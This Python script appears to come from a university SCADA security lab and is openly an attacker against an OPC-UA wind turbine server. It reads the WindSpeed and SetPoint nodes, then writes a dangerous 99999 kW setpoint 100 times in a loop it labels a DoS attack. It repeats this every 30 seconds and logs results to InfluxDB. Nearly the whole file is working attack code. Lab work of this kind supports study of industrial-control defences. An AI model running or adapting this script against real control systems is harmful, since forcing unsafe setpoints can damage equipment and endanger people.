import asyncio
import time
from asyncua import Client
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

INFLUX_URL = "http://influxdb:8086"
INFLUX_TOKEN = "scada-token-123"
INFLUX_ORG = "scada-lab"
INFLUX_BUCKET = "scada-metrics"

_influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
_write_api = _influx.write_api(write_options=SYNCHRONOUS)


def push_metric(action, field_name, value):
    try:
        point = (
            Point("opcua")
            .tag("container", "opcua-attacker")
            .tag("action", action)
            .field(field_name, float(value))
        )
        _write_api.write(bucket=INFLUX_BUCKET, record=point)
    except Exception as e:
        print(f"InfluxDB write error: {e}")


async def run_opcua_attacker():
    url = "opc.tcp://opcua-server:4840/freeopcua/server/"
    uri = "http://scada.hcmut.edu.vn"
    
    # Chờ server khởi động
    await asyncio.sleep(5)
    
    while True:
        try:
            client = Client(url=url)
            await client.connect()
            print(f"Kết nối thành công đến OPC-UA Server! (Attacker)")
            
            try:
                idx = await client.get_namespace_index(uri)
                
                # Get nodes
                wind_speed_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:WindSpeed"]
                )
                setpoint_node = await client.nodes.root.get_child(
                    ["0:Objects", f"{idx}:Turbine", f"{idx}:Control", f"{idx}:SetPoint"]
                )
                
                print("\n--- BẮT ĐẦU CHIẾN DỊCH TẤN CÔNG ---")
                
                # Phase 1: Reconnaissance
                print("[PHASE 1] Quét dữ liệu Turbine...")
                wind_speed = await wind_speed_node.read_value()
                setpoint = await setpoint_node.read_value()
                print(f" [+] Tốc độ gió: {wind_speed}")
                print(f" [+] SetPoint hiện tại: {setpoint}")
                push_metric("attack_recon", "wind_speed", wind_speed)
                push_metric("attack_recon", "setpoint", setpoint)
                
                await asyncio.sleep(2)
                
                # Phase 2: DoS Attack
                print("\n[PHASE 2] Tấn công DoS: Ghi SetPoint nguy hiểm (99999 kW) lặp 100 lần...")
                success_count = 0
                malicious_setpoint = 99999.0
                
                for i in range(100):
                    try:
                        start_time = time.time()
                        await setpoint_node.write_value(malicious_setpoint)
                        latency = (time.time() - start_time) * 1000
                        
                        push_metric("write", "latency", latency)
                        push_metric("write", "node_value", malicious_setpoint)
                        
                        success_count += 1
                        await asyncio.sleep(0.05)
                    except Exception as e:
                        print(f" Lỗi ghi ở vòng {i + 1}: {e}")
                
                print(f" [+] Giai đoạn 2 hoàn tất. Thành công ghi {success_count}/100 lệnh.")
                print("--- KẾT THÚC ĐỢT TẤN CÔNG. CHỜ 30 GIÂY ---\n")
                
            finally:
                await client.disconnect()
            
            await asyncio.sleep(30)
            
        except Exception as e:
            print(f"[Attacker] Lỗi: {e}. Thử lại sau 5 giây...")
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(run_opcua_attacker())
